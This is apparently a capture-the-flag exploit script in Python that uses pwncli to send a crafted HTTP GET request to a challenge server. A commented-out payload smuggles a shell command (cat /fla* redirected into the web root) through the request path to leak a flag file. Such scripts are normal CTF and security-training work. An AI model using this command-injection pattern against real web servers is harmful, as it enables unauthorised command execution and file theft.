#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
# set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc
context.log_level = "debug"


def get_payload(command):
    payload = b"get /" + command + b" HTTP/1.0\r\n"
    payload += b"Host: 127.0.0.1\r\n"
    payload += f"Content-Length: 100\r\n".encode()
    payload += b"Content-Type: application/x-www-form-urlencoded\r\n"
    payload += b"Connection: close\r\n"
    payload += b"\r\n"
    return payload


# payload = get_payload(b"cat%20/fla*>/home/ctf/html/index.html")
payload = get_payload(b"index.html")
s(payload)

ia()

# 73037178244216013737456202378991
